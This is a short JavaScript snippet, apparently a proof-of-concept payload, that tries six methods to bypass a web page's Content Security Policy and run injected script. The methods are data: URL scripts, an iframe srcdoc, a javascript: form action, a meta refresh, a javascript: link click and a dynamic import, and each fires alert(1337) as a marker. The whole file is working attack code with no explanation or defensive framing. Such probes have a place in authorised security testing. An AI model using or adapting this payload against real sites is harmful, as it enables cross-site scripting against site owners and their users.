(function() {
    console.log('Trying CSP bypass methods...');
    
    // Method 1: Dynamic script with various data URLs
    var scriptTypes = [
        'data:text/javascript,alert(1337)',
        'data:application/javascript,alert(1337)',
        'data:application/x-javascript,alert(1337)'
    ];
    
    scriptTypes.forEach(type => {
        try {
            var s = document.createElement('script');
            s.src = type;
            document.head.appendChild(s);
        } catch(e) {}
    });
    
    // Method 2: Iframe attempts
    try {
        var iframe = document.createElement('iframe');
        iframe.srcdoc = '<script>alert(1337)</script>';
        document.body.appendChild(iframe);
    } catch(e) {}
    
    // Method 3: Form submission
    try {
        var form = document.createElement('form');
        form.action = 'javascript:alert(1337)';
        document.body.appendChild(form);
        form.submit();
    } catch(e) {}
    
    // Method 4: Meta refresh
    try {
        var meta = document.createElement('meta');
        meta.httpEquiv = 'refresh';
        meta.content = '0;url=javascript:alert(1337)';
        document.head.appendChild(meta);
    } catch(e) {}
    
    // Method 5: Link click
    try {
        var link = document.createElement('a');
        link.href = 'javascript:alert(1337)';
        document.body.appendChild(link);
        link.click();
    } catch(e) {}
    
    // Method 6: Dynamic import
    try {
        import('data:application/javascript,alert(1337)');
    } catch(e) {}
    
    console.log('CSP bypass attempts completed');
})();
